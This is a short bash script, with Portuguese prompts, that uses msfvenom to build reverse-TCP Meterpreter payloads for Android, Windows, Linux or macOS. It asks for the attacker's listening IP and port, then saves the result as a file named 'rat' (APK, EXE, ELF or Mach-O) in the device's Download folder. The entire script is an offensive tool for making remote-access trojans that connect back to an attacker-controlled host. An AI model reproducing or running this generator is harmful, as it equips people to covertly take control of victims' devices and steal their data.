#!/bin/bash
T="$1"
read -rp "LHOST (Seu IP): " lh
read -rp "LPORT: " lp
case "$T" in
  apk) msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > /sdcard/Download/rat.apk ; echo -e "\033[1;37m[+] APK em /sdcard/Download\033[0m" ;;
  exe) msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -f exe > /sdcard/Download/rat.exe ; echo -e "\033[1;37m[+] EXE em /sdcard/Download\033[0m" ;;
  elf) msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -f elf > /sdcard/Download/rat.elf ; echo -e "\033[1;37m[+] ELF em /sdcard/Download\033[0m" ;;
  macos) msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -f macho > /sdcard/Download/rat.macho ; echo -e "\033[1;37m[+] MAC em /sdcard/Download\033[0m" ;;
esac
